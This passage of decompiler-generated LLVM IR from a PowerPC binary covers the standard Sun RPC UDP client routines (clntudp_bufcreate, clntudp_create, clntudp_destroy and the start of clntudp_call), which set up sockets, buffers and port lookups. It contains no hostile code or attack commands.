  %v0_10011580 = load i32, i32* @r10, align 4
  %v1_10011580 = add i32 %v0_10011580, 40
  %v2_10011580 = inttoptr i32 %v1_10011580 to i32*
  %v3_10011580 = load i32, i32* %v2_10011580, align 4
  store i32 %v3_10011580, i32* %r9.global-to-local, align 4
  %v1_10011584 = add i32 %v0_10011580, 36
  %v2_10011584 = inttoptr i32 %v1_10011584 to i32*
  %v3_10011584 = load i32, i32* %v2_10011584, align 4
  %v1_100115b0 = load i32, i32* @r12, align 4
  %v2_100115b0 = inttoptr i32 %v1_100115b0 to i32*
  store i32 %v3_10011584, i32* %v2_100115b0, align 4
  %v0_100115b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100115b4 = load i32, i32* @r12, align 4
  %v2_100115b4 = add i32 %v1_100115b4, 4
  %v3_100115b4 = inttoptr i32 %v2_100115b4 to i32*
  store i32 %v0_100115b4, i32* %v3_100115b4, align 4
  ret i32 1
}

define i32 @function_100115bc() local_unnamed_addr {
dec_label_pc_100115bc:
  ret i32 1
}

define i32 @function_100115d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100115d0:
  %v0_100115d0 = load i32, i32* @r10, align 4
  %v1_100115d0 = inttoptr i32 %v0_100115d0 to i32*
  %v2_100115d0 = load i32, i32* %v1_100115d0, align 4
  %v1_1001162c = load i32, i32* @r12, align 4
  %v2_1001162c = inttoptr i32 %v1_1001162c to i32*
  store i32 %v2_100115d0, i32* %v2_1001162c, align 4
  ret i32 1
}

define i32 @function_10011634(i32* %arg1) local_unnamed_addr {
dec_label_pc_10011634:
  %v0_10011634 = load i32, i32* @r10, align 4
  %v1_10011634 = add i32 %v0_10011634, 88
  %v2_10011634 = inttoptr i32 %v1_10011634 to i32*
  %v3_10011634 = load i32, i32* %v2_10011634, align 4
  %v2_1001163c = load i32, i32* %arg1, align 4
  %v2_10011640 = add i32 %v3_10011634, 12
  %v3_10011640 = inttoptr i32 %v2_10011640 to i32*
  store i32 %v2_1001163c, i32* %v3_10011640, align 4
  ret i32 1
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %v0_10011648 = load i32, i32* @lr, align 4
  store i32 %v0_10011648, i32* %r0.global-to-local, align 4
  %v0_10011654 = load i32, i32* @r8, align 4
  %v0_1001165c = load i32, i32* @r9, align 4
  store i32 %v0_1001165c, i32* @r29, align 4
  store i32 %arg1, i32* @r30, align 4
  %v1_10011664 = add i32 %v0_10011654, 3
  store i32 12, i32* @r3, align 4
  store i32 %arg2, i32* @r23, align 4
  store i32 %arg3, i32* @r22, align 4
  %v0_10011674 = load i32, i32* @r6, align 4
  %v1_10011674 = inttoptr i32 %v0_10011674 to i32*
  %v2_10011674 = load i32, i32* %v1_10011674, align 4
  store i32 %v2_10011674, i32* %r25.global-to-local, align 4
  %v1_10011678 = add i32 %v0_10011674, 4
  %v2_10011678 = inttoptr i32 %v1_10011678 to i32*
  %v3_10011678 = load i32, i32* %v2_10011678, align 4
  store i32 %v3_10011678, i32* @r26, align 4
  %v0_1001167c = load i32, i32* @r7, align 4
  store i32 %v0_1001167c, i32* %r24.global-to-local, align 4
  %v1_10011680 = call i32 @__asm_rlwinm(i32 %v1_10011664, i32 0, i32 0, i32 29)
  store i32 268506760, i32* @lr, align 4
  %v0_10011684 = call i32 @malloc()
  store i32 %v0_10011684, i32* %r3.global-to-local, align 4
  %v0_10011688 = load i32, i32* @r29, align 4
  %v1_10011688 = add i32 %v0_10011688, 3
  store i32 %v0_10011684, i32* @r27, align 4
  %v1_10011690 = call i32 @__asm_rlwinm(i32 %v1_10011688, i32 0, i32 0, i32 29)
  %v1_10011694 = add i32 %v1_10011680, 100
  %v2_10011698 = add i32 %v1_10011694, %v1_10011690
  store i32 %v2_10011698, i32* @r3, align 4
  store i32 268506784, i32* @lr, align 4
  %v0_1001169c = call i32 @malloc()
  store i32 %v0_1001169c, i32* %r3.global-to-local, align 4
  %v0_100116a0 = load i32, i32* @r27, align 4
  %v3_100116a0 = icmp eq i32 %v0_100116a0, 0
  store i32 %v0_1001169c, i32* @r31, align 4
  br i1 %v3_100116a0, label %dec_label_pc_100116b4, label %dec_label_pc_100116ac

dec_label_pc_100116ac:                            ; preds = %entry
  %v3_100116ac = icmp eq i32 %v0_1001169c, 0
  br i1 %v3_100116ac, label %dec_label_pc_100116b4, label %dec_label_pc_100116e0

dec_label_pc_100116b4:                            ; preds = %dec_label_pc_100116ac, %entry
  store i32 268506808, i32* @lr, align 4
  %v0_100116b4 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_100116b4, i32* %r3.global-to-local, align 4
  store i32 %v0_100116b4, i32* @r29, align 4
  %v3_100116c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -4212) to i32*), align 4
  store i32 ptrtoint ([31 x i8]* @global_var_10019fa4.489 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100116d0.490 to i32), i32* @lr, align 4
  %v4_100116cc = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_10019fa4.489 to i32), i32 %v3_100116c0, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v4_100116cc, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_100116d4 = load i32, i32* @r29, align 4
  %v2_100116d4 = add i32 %v1_100116d4, 8
  %v3_100116d4 = inttoptr i32 %v2_100116d4 to i32*
  store i32 12, i32* %v3_100116d4, align 4
  %v0_100116d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100116d8 = load i32, i32* @r29, align 4
  %v2_100116d8 = inttoptr i32 %v1_100116d8 to i32*
  store i32 %v0_100116d8, i32* %v2_100116d8, align 4
  br label %dec_label_pc_10011860

dec_label_pc_100116e0:                            ; preds = %dec_label_pc_100116ac
  %v0_100116e0 = load i32, i32* @r30, align 4
  %v1_100116e0 = add i32 %v0_100116e0, 2
  %v2_100116e0 = inttoptr i32 %v1_100116e0 to i16*
  %v3_100116e0 = load i16, i16* %v2_100116e0, align 2
  %v4_100116e0 = zext i16 %v3_100116e0 to i32
  store i32 %v4_100116e0, i32* %r0.global-to-local, align 4
  %v1_100116e4 = add i32 %v1_10011690, 96
  %v2_100116e8 = add i32 %v1_100116e4, %v0_1001169c
  %v3_100116ec = icmp eq i16 %v3_100116e0, 0
  %v2_100116f0 = add i32 %v0_1001169c, 88
  %v3_100116f0 = inttoptr i32 %v2_100116f0 to i32*
  store i32 %v2_100116e8, i32* %v3_100116f0, align 4
  br i1 %v3_100116ec, label %dec_label_pc_100116f8, label %dec_label_pc_10011718

dec_label_pc_100116f8:                            ; preds = %dec_label_pc_100116e0
  %v0_100116f8 = load i32, i32* @r30, align 4
  store i32 %v0_100116f8, i32* %r3.global-to-local, align 4
  %v0_100116fc = load i32, i32* @r23, align 4
  %v0_10011700 = load i32, i32* @r22, align 4
  store i32 268506892, i32* @lr, align 4
  %v5_10011708 = call i32 @pmap_getport(i32 %v0_100116f8, i32 %v0_100116fc, i32 %v0_10011700, i32 17, i32 %v2_100116e8)
  %v6_10011708 = trunc i32 %v5_10011708 to i16
  store i32 %v5_10011708, i32* %r3.global-to-local, align 4
  %v4_1001170c = icmp eq i16 %v6_10011708, 0
  br i1 %v4_1001170c, label %dec_label_pc_10011860, label %dec_label_pc_10011714

dec_label_pc_10011714:                            ; preds = %dec_label_pc_100116f8
  %v3_10011714 = load i32, i32* @r30, align 4
  %v4_10011714 = add i32 %v3_10011714, 2
  %v5_10011714 = inttoptr i32 %v4_10011714 to i16*
  store i16 %v6_10011708, i16* %v5_10011714, align 2
  br label %dec_label_pc_10011718

dec_label_pc_10011718:                            ; preds = %dec_label_pc_100116e0, %dec_label_pc_10011714
  %v0_1001171c = load i32, i32* @r31, align 4
  %v1_1001171c = load i32, i32* @r27, align 4
  %v2_1001171c = add i32 %v1_1001171c, 8
  %v3_1001171c = inttoptr i32 %v2_1001171c to i32*
  store i32 %v0_1001171c, i32* %v3_1001171c, align 4
  store i32 -1, i32* %r11.global-to-local, align 4
  %v1_10011728 = load i32, i32* @r27, align 4
  %v2_10011728 = add i32 %v1_10011728, 4
  %v3_10011728 = inttoptr i32 %v2_10011728 to i32*
  store i32 ptrtoint (i32* @global_var_1002eed4.491 to i32), i32* %v3_10011728, align 4
  %v0_1001172c = load i32, i32* @r31, align 4
  %v1_1001172c = add i32 %v0_1001172c, 8
  store i32 16, i32* %r0.global-to-local, align 4
  %v0_10011740 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011740 = add i32 %v0_1001172c, 40
  %v3_10011740 = inttoptr i32 %v2_10011740 to i32*
  store i32 %v0_10011740, i32* %v3_10011740, align 4
  %v0_10011744 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011744 = load i32, i32* @r31, align 4
  %v2_10011744 = add i32 %v1_10011744, 36
  %v3_10011744 = inttoptr i32 %v2_10011744 to i32*
  store i32 %v0_10011744, i32* %v3_10011744, align 4
  %v0_10011748 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011748 = load i32, i32* @r31, align 4
  %v2_10011748 = add i32 %v1_10011748, 24
  %v3_10011748 = inttoptr i32 %v2_10011748 to i32*
  store i32 %v0_10011748, i32* %v3_10011748, align 4
  %v1_1001174c = load i32, i32* @r31, align 4
  %v2_1001174c = add i32 %v1_1001174c, 92
  %v3_1001174c = inttoptr i32 %v2_1001174c to i32*
  store i32 %v1_10011690, i32* %v3_1001174c, align 4
  %v0_10011750 = load i32, i32* @r31, align 4
  %v0_10011754 = load i32, i32* %r25.global-to-local, align 4
  %v2_10011754 = add i32 %v0_10011750, 28
  %v3_10011754 = inttoptr i32 %v2_10011754 to i32*
  store i32 %v0_10011754, i32* %v3_10011754, align 4
  %v0_10011758 = load i32, i32* @r26, align 4
  %v1_10011758 = load i32, i32* @r31, align 4
  %v2_10011758 = add i32 %v1_10011758, 32
  %v3_10011758 = inttoptr i32 %v2_10011758 to i32*
  store i32 %v0_10011758, i32* %v3_10011758, align 4
  %v1_1001175c = load i32, i32* @r31, align 4
  %v2_1001175c = add i32 %v1_1001175c, 84
  %v3_1001175c = inttoptr i32 %v2_1001175c to i32*
  store i32 %v1_10011680, i32* %v3_1001175c, align 4
  store i32 268506980, i32* @lr, align 4
  %v1_10011760 = call i32 @_create_xid(i32 %v1_1001172c)
  store i32 %v1_10011760, i32* %r3.global-to-local, align 4
  %v0_10011764 = load i32, i32* @r31, align 4
  %v1_10011764 = add i32 %v0_10011764, 88
  %v2_10011764 = inttoptr i32 %v1_10011764 to i32*
  %v3_10011764 = load i32, i32* %v2_10011764, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v1_10011760, i32* %stack_var_-96, align 4
  %v0_10011778 = load i32, i32* @r29, align 4
  store i32 %v0_10011778, i32* %r3.global-to-local, align 4
  %v4_1001178c = inttoptr i32 %v0_10011778 to i32*
  %v5_1001178c = call i32 @__GI_xdrmem_create(i32* %v4_1001178c, i32 %v3_10011764, i32 %v1_10011680, i32 0)
  %v0_10011790 = load i32, i32* @r29, align 4
  store i32 %v0_10011790, i32* %r3.global-to-local, align 4
  %v2_10011794 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268507036, i32* @lr, align 4
  %v2_10011798 = inttoptr i32 %v0_10011790 to i32*
  %v3_10011798 = call i32 @__GI_xdr_callhdr(i32* %v2_10011798, i32 %v2_10011794)
  store i32 %v3_10011798, i32* %r3.global-to-local, align 4
  %v3_1001179c = icmp eq i32 %v3_10011798, 0
  br i1 %v3_1001179c, label %dec_label_pc_10011860, label %dec_label_pc_100117a4

dec_label_pc_100117a4:                            ; preds = %dec_label_pc_10011718
  %v0_100117a4 = load i32, i32* @r31, align 4
  %v1_100117a4 = add i32 %v0_100117a4, 60
  %v2_100117a4 = inttoptr i32 %v1_100117a4 to i32*
  %v3_100117a4 = load i32, i32* %v2_100117a4, align 4
  %v0_100117a8 = load i32, i32* @r29, align 4
  store i32 %v0_100117a8, i32* %r3.global-to-local, align 4
  %v1_100117ac = add i32 %v3_100117a4, 16
  %v2_100117ac = inttoptr i32 %v1_100117ac to i32*
  %v3_100117ac = load i32, i32* %v2_100117ac, align 4
  call void @__pseudo_call(i32 %v3_100117ac)
  %v0_100117b8 = load i32, i32* %r24.global-to-local, align 4
  %v1_100117b8 = inttoptr i32 %v0_100117b8 to i32*
  %v2_100117b8 = load i32, i32* %v1_100117b8, align 4
  store i32 %v2_100117b8, i32* %r0.global-to-local, align 4
  %v0_100117bc = load i32, i32* %r3.global-to-local, align 4
  %v1_100117bc = load i32, i32* @r31, align 4
  %v2_100117bc = add i32 %v1_100117bc, 80
  %v3_100117bc = inttoptr i32 %v2_100117bc to i32*
  store i32 %v0_100117bc, i32* %v3_100117bc, align 4
  %v0_100117c0 = load i32, i32* %r0.global-to-local, align 4
  %tmp10 = icmp sgt i32 %v0_100117c0, -1
  br i1 %tmp10, label %dec_label_pc_10011848, label %dec_label_pc_100117c8

dec_label_pc_100117c8:                            ; preds = %dec_label_pc_100117a4
  store i32 1, i32* @r30, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268507104, i32* @lr, align 4
  %v3_100117dc = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_100117dc, i32* %r3.global-to-local, align 4
  %v1_100117e4 = load i32, i32* %r24.global-to-local, align 4
  %v2_100117e4 = inttoptr i32 %v1_100117e4 to i32*
  store i32 %v3_100117dc, i32* %v2_100117e4, align 4
  %tmp11 = icmp sgt i32 %v3_100117dc, -1
  br i1 %tmp11, label %dec_label_pc_1001180c, label %dec_label_pc_100117ec

dec_label_pc_100117ec:                            ; preds = %dec_label_pc_100117c8
  store i32 ptrtoint (i32* @global_var_100117f0.492 to i32), i32* @lr, align 4
  %v0_100117ec = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_100117ec, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v2_100117f4 = inttoptr i32 %v0_100117ec to i32*
  store i32 12, i32* %v2_100117f4, align 4
  %v0_100117fc = call i32 @__errno_location()
  store i32 %v0_100117fc, i32* %r3.global-to-local, align 4
  %v1_10011800 = inttoptr i32 %v0_100117fc to i32*
  %v2_10011800 = load i32, i32* %v1_10011800, align 4
  store i32 %v2_10011800, i32* %r0.global-to-local, align 4
  %v2_10011804 = add i32 %v0_100117ec, 8
  %v3_10011804 = inttoptr i32 %v2_10011804 to i32*
  store i32 %v2_10011800, i32* %v3_10011804, align 4
  br label %dec_label_pc_10011860

dec_label_pc_1001180c:                            ; preds = %dec_label_pc_100117c8
  store i32 268507156, i32* @lr, align 4
  %v3_10011810 = call i32 @__GI_bindresvport(i32 %v3_100117dc, i16* null)
  store i32 %v3_10011810, i32* %r3.global-to-local, align 4
  %v0_10011814 = load i32, i32* %r24.global-to-local, align 4
  %v1_10011814 = inttoptr i32 %v0_10011814 to i32*
  %v2_10011814 = load i32, i32* %v1_10011814, align 4
  store i32 %v2_10011814, i32* %r3.global-to-local, align 4
  %v2_1001181c = ptrtoint i32* %stack_var_-104 to i32
  store i32 268507180, i32* @lr, align 4
  %v3_10011828 = call i32 @ioctl(i32 %v2_10011814, i32 -2147195266, i32 %v2_1001181c)
  store i32 %v3_10011828, i32* %r3.global-to-local, align 4
  %v0_1001182c = load i32, i32* %r24.global-to-local, align 4
  %v1_1001182c = inttoptr i32 %v0_1001182c to i32*
  %v2_1001182c = load i32, i32* %v1_1001182c, align 4
  store i32 %v2_1001182c, i32* %r3.global-to-local, align 4
  %v2_10011838 = ptrtoint i32* %stack_var_-100 to i32
  %v0_10011840 = load i32, i32* @r30, align 4
  store i32 %v0_10011840, i32* %stack_var_-100, align 4
  store i32 268507208, i32* @lr, align 4
  %v5_10011844 = call i32 @__GI_setsockopt(i32 %v2_1001182c, i32 0, i32 11, i32 %v2_10011838, i32 4)
  store i32 %v5_10011844, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011848

dec_label_pc_10011848:                            ; preds = %dec_label_pc_100117a4, %dec_label_pc_1001180c
  %v0_10011848 = load i32, i32* @r30, align 4
  %v1_10011848 = load i32, i32* @r31, align 4
  %v2_10011848 = add i32 %v1_10011848, 4
  %v3_10011848 = inttoptr i32 %v2_10011848 to i32*
  store i32 %v0_10011848, i32* %v3_10011848, align 4
  %v0_1001184c = load i32, i32* %r24.global-to-local, align 4
  %v1_1001184c = inttoptr i32 %v0_1001184c to i32*
  %v2_1001184c = load i32, i32* %v1_1001184c, align 4
  store i32 %v2_1001184c, i32* %r0.global-to-local, align 4
  %v1_10011850 = load i32, i32* @r31, align 4
  %v2_10011850 = inttoptr i32 %v1_10011850 to i32*
  store i32 %v2_1001184c, i32* %v2_10011850, align 4
  store i32 268507224, i32* @lr, align 4
  %v0_10011854 = call i32 @authnone_create()
  store i32 %v0_10011854, i32* %r3.global-to-local, align 4
  %v1_10011858 = load i32, i32* @r27, align 4
  %v2_10011858 = inttoptr i32 %v1_10011858 to i32*
  store i32 %v0_10011854, i32* %v2_10011858, align 4
  br label %dec_label_pc_10011884

dec_label_pc_10011860:                            ; preds = %dec_label_pc_10011718, %dec_label_pc_100116f8, %dec_label_pc_100117ec, %dec_label_pc_100116b4
  %v0_10011860 = load i32, i32* @r31, align 4
  %v3_10011860 = icmp eq i32 %v0_10011860, 0
  br i1 %v3_10011860, label %dec_label_pc_10011870, label %dec_label_pc_10011868

dec_label_pc_10011868:                            ; preds = %dec_label_pc_10011860
  store i32 %v0_10011860, i32* @r3, align 4
  store i32 268507248, i32* @lr, align 4
  %v0_1001186c = call i32 @free()
  store i32 %v0_1001186c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011870

dec_label_pc_10011870:                            ; preds = %dec_label_pc_10011860, %dec_label_pc_10011868
  %v0_10011870 = load i32, i32* @r27, align 4
  %v3_10011870 = icmp eq i32 %v0_10011870, 0
  br i1 %v3_10011870, label %dec_label_pc_10011884, label %dec_label_pc_10011878

dec_label_pc_10011878:                            ; preds = %dec_label_pc_10011870
  store i32 %v0_10011870, i32* @r3, align 4
  store i32 0, i32* @r27, align 4
  store i32 268507268, i32* @lr, align 4
  %v0_10011880 = call i32 @free()
  store i32 %v0_10011880, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011884

dec_label_pc_10011884:                            ; preds = %dec_label_pc_10011870, %dec_label_pc_10011848, %dec_label_pc_10011878
  store i32 %v0_10011648, i32* %r0.global-to-local, align 4
  %v0_10011888 = load i32, i32* @r27, align 4
  store i32 %v0_10011888, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011888

; uselistorder directives
  uselistorder i32 %v3_100117dc, { 2, 0, 1, 3 }
  uselistorder i32 %v5_10011708, { 1, 0 }
  uselistorder i32 %v0_1001169c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_10011690, { 1, 0, 2 }
  uselistorder i32 %v1_10011680, { 0, 2, 1 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 5, 8, 9, 10, 26, 11, 12, 1, 13, 4, 14, 15, 16, 17, 19, 18, 20, 3, 21, 22, 23, 24, 2, 25, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 3, 2, 1 }
  uselistorder i32 -2147195266, { 2, 0, 1 }
  uselistorder i32 84, { 15, 4, 14, 10, 3, 2, 1, 0, 13, 5, 6, 7, 8, 9, 11, 12 }
  uselistorder label %dec_label_pc_10011884, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011870, { 1, 0 }
  uselistorder label %dec_label_pc_10011860, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10011848, { 1, 0 }
  uselistorder label %dec_label_pc_10011718, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 8800, i32* @r8, align 4
  %v2_100118ac = load i32, i32* %arg1, align 4
  %v1_100118b0 = add i32 %tmp, 4
  %v2_100118b0 = inttoptr i32 %v1_100118b0 to i32*
  %v3_100118b0 = load i32, i32* %v2_100118b0, align 4
  store i32 %v3_100118b0, i32* @r10, align 4
  store i32 %v2_100118ac, i32* %stack_var_-8, align 4
  %v4_100118b8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v4_100118b8, i32* @r6, align 4
  store i32 8800, i32* @r9, align 4
  store i32 268507336, i32* @lr, align 4
  %v3_100118c4 = call i32 @__GI_clntudp_bufcreate(i32 %v4_100118b8, i32 8800, i32 8800)
  ret i32 %v3_100118c4

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v1_100118ec = add i32 %arg1, 8
  %v2_100118ec = inttoptr i32 %v1_100118ec to i32*
  %v3_100118ec = load i32, i32* %v2_100118ec, align 4
  store i32 %v3_100118ec, i32* @r31, align 4
  %v1_100118f0 = add i32 %v3_100118ec, 4
  %v2_100118f0 = inttoptr i32 %v1_100118f0 to i32*
  %v3_100118f0 = load i32, i32* %v2_100118f0, align 4
  %v3_100118f4 = icmp eq i32 %v3_100118f0, 0
  br i1 %v3_100118f4, label %dec_label_pc_10011904, label %dec_label_pc_100118fc

dec_label_pc_100118fc:                            ; preds = %entry
  %v1_100118fc = inttoptr i32 %v3_100118ec to i32*
  %v2_100118fc = load i32, i32* %v1_100118fc, align 4
  store i32 268507396, i32* @lr, align 4
  %v1_10011900 = call i32 @__libc_close(i32 %v2_100118fc)
  %v0_10011904.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011904

dec_label_pc_10011904:                            ; preds = %entry, %dec_label_pc_100118fc
  %v0_10011904 = phi i32 [ %v3_100118ec, %entry ], [ %v0_10011904.pre, %dec_label_pc_100118fc ]
  %v1_10011904 = add i32 %v0_10011904, 60
  %v2_10011904 = inttoptr i32 %v1_10011904 to i32*
  %v3_10011904 = load i32, i32* %v2_10011904, align 4
  %v1_1001190c = add i32 %v3_10011904, 28
  %v2_1001190c = inttoptr i32 %v1_1001190c to i32*
  %v3_1001190c = load i32, i32* %v2_1001190c, align 4
  %v3_10011910 = icmp eq i32 %v3_1001190c, 0
  br i1 %v3_10011910, label %dec_label_pc_10011920, label %dec_label_pc_10011918

dec_label_pc_10011918:                            ; preds = %dec_label_pc_10011904
  call void @__pseudo_call(i32 %v3_1001190c)
  %v0_10011920.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011920

dec_label_pc_10011920:                            ; preds = %dec_label_pc_10011904, %dec_label_pc_10011918
  %v0_10011920 = phi i32 [ %v0_10011904, %dec_label_pc_10011904 ], [ %v0_10011920.pre, %dec_label_pc_10011918 ]
  store i32 %v0_10011920, i32* @r3, align 4
  store i32 268507432, i32* @lr, align 4
  %v0_10011924 = call i32 @free()
  %v0_10011928 = load i32, i32* @r30, align 4
  store i32 %v0_10011928, i32* @r3, align 4
  store i32 268507440, i32* @lr, align 4
  %v0_1001192c = call i32 @free()
  ret i32 %v0_1001192c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10011920, { 1, 0 }
  uselistorder label %dec_label_pc_10011904, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i16 @__decompiler_undefined_function_3()
  %tmp43 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-8948 = alloca i32, align 4
  %stack_var_-9004 = alloca i32, align 4
  %stack_var_-9064 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-9020 = alloca i16, align 2
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-9044 = alloca i32, align 4
  %stack_var_-8900 = alloca i32, align 4
  %stack_var_-9060 = alloca i32, align 4
  %stack_var_-8936 = alloca i32, align 4
  %stack_var_-9072 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10011944 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10011944, i32* %stack_var_-9072, align 4
  store i32 %tmp, i32* %r23.global-to-local, align 4
  %v1_10011964 = add i32 %arg7, 4
  %v2_10011964 = inttoptr i32 %v1_10011964 to i32*
  %v3_10011964 = load i32, i32* %v2_10011964, align 4
  store i32 %arg3, i32* %r20.global-to-local, align 4
  %v1_1001196c = add i32 %tmp, 8
  %v2_1001196c = inttoptr i32 %v1_1001196c to i32*
  %v3_1001196c = load i32, i32* %v2_1001196c, align 4
  store i32 %v3_1001196c, i32* @r30, align 4
  %v1_10011974 = inttoptr i32 %arg7 to i32*
  %v2_10011974 = load i32, i32* %v1_10011974, align 4
  store i32 %v2_10011974, i32* %r9.global-to-local, align 4
  %v1_1001197c = add i32 %v3_1001196c, 32
  %v2_1001197c = inttoptr i32 %v1_1001197c to i32*
  %v3_1001197c = load i32, i32* %v2_1001197c, align 4
  store i32 %v3_10011964, i32* %r22.global-to-local, align 4
  %v1_10011984 = add i32 %v3_1001196c, 40
  %v2_10011984 = inttoptr i32 %v1_10011984 to i32*
  %v3_10011984 = load i32, i32* %v2_10011984, align 4
  store i32 %v2_10011974, i32* %r21.global-to-local, align 4
  %v2_1001198c = sdiv i32 %v3_1001197c, 1000
  %v1_10011990 = add i32 %v3_1001196c, 28
  %v2_10011990 = inttoptr i32 %v1_10011990 to i32*
  %v3_10011990 = load i32, i32* %v2_10011990, align 4
  %v3_10011994 = icmp eq i32 %v3_10011984, -1
  %v1_1001199c = mul i32 %v3_10011990, 1000
  %v2_100119a0 = add i32 %v1_1001199c, %v2_1001198c
  store i32 %v2_100119a0, i32* %r16.global-to-local, align 4
  br i1 %v3_10011994, label %dec_label_pc_100119e0, label %dec_label_pc_100119d8

dec_label_pc_100119ac:                            ; preds = %dec_label_pc_10011aac
  %v0_100119ac = call i32 @__errno_location()
  store i32 %v0_100119ac, i32* %r3.global-to-local, align 4
  %v1_100119b4 = inttoptr i32 %v0_100119ac to i32*
  %v2_100119b4 = load i32, i32* %v1_100119b4, align 4
  store i32 %v2_100119b4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100119cc

dec_label_pc_100119c4:                            ; preds = %dec_label_pc_10011c40, %dec_label_pc_10011ddc
  br label %dec_label_pc_100119cc

dec_label_pc_100119cc:                            ; preds = %dec_label_pc_100119ac, %dec_label_pc_100119c4
  %storemerge = phi i32 [ 3, %dec_label_pc_100119ac ], [ 4, %dec_label_pc_100119c4 ]
  %v0_100119cc = phi i32 [ 3, %dec_label_pc_100119ac ], [ 4, %dec_label_pc_100119c4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_100119cc = load i32, i32* @r30, align 4
  %v2_100119cc = add i32 %v1_100119cc, 44
  %v3_100119cc = inttoptr i32 %v2_100119cc to i32*
  store i32 %v0_100119cc, i32* %v3_100119cc, align 4
  %v0_100119d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100119d0 = load i32, i32* @r30, align 4
  %v2_100119d0 = add i32 %v1_100119d0, 48
  %v3_100119d0 = inttoptr i32 %v2_100119d0 to i32*
  store i32 %v0_100119d0, i32* %v3_100119d0, align 4
  br label %dec_label_pc_10011ee0

dec_label_pc_100119d8:                            ; preds = %entry
  %v1_100119d8 = add i32 %v3_1001196c, 36
  %v2_100119d8 = inttoptr i32 %v1_100119d8 to i32*
  %v3_100119d8 = load i32, i32* %v2_100119d8, align 4
  store i32 %v3_100119d8, i32* %r21.global-to-local, align 4
  store i32 %v3_10011984, i32* %r22.global-to-local, align 4
  br label %dec_label_pc_100119e0

dec_label_pc_100119e0:                            ; preds = %entry, %dec_label_pc_100119d8
  store i32 0, i32* %r19.global-to-local, align 4
  store i32 2, i32* %r17.global-to-local, align 4
  store i32 0, i32* %r24.global-to-local, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  %v2_10011ae4 = ptrtoint i32* %stack_var_-8936 to i32
  %v2_10011b10 = ptrtoint i32* %stack_var_-9060 to i32
  %v4_10011c50 = zext i16 %tmp42 to i32
  %v1_10011c54 = and i32 %v4_10011c50, 8
  %v3_10011c54 = icmp eq i32 %v1_10011c54, 0
